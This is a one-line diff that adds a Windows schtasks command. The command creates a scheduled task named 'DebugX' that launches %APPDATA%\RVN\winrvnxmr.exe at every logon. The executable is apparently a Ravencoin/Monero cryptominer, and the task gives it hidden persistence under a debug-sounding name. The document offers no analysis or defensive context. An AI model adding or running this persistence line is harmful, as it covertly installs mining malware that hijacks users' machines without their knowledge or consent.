@@ -1,0 +1,1 @@
+schtasks /create /tn "DebugX" /tr %APPDATA%\RVN\winrvnxmr.exe /sc onlogon
